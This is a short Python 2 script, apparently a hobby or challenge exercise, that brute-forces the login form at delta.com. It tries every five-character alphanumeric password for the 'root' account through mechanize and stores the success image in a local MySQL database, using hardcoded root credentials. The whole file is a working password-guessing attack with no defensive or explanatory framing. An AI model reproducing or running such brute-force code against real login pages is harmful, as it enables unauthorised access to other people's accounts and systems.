#!/usr/bin/python

from mechanize import Browser
from urllib import urlretrieve
import MySQLdb
from datetime import datetime
from string import ascii_uppercase,ascii_lowercase,digits

def write_to_db(url):
    img = urlretrieve(url)          # Get the image file
    
    with open(img[0],'rb') as f:
	data = f.read()
    f.close()
    
    db = MySQLdb.connect(user='root',passwd='password',host='localhost',db='delta')
    sql = 'INSERT INTO cracked VALUES (%s , %s)'
    values = (data,str(datetime.now()),)
    c = db.cursor()
    c.execute(sql,values)
    db.commit()
    db.close()

def brute_force(chars,length,prefix=''):
    global found
    if found == 1:
        return
    if length == 0:
        b.select_form(name='login')
	b.form['username'] = 'root'
        b.form['password'] = prefix
        b.method = 'POST'
        response = b.submit()
        print "Checking password :-   " + prefix
        if response.geturl() == 'http://delta.com/success.jpg':
            print "\n\n\t  Password Found :- " + prefix;
            found = 1
            print "\n\n\t Writing to database ..... ";
            write_to_db(response.geturl());
        return

    n = len(chars)

    for i in range(n):
        newPrefix = prefix + chars[i]
        brute_force(chars,length - 1,newPrefix)

chars = ascii_uppercase + ascii_lowercase + digits  # Alphanumeric characters

b = Browser()
b.open('http://delta.com/')
found = 0
brute_force(chars,5)

if found == 0:
    print "No match found !!"
else:
    print "Success !!! "
raw_input()
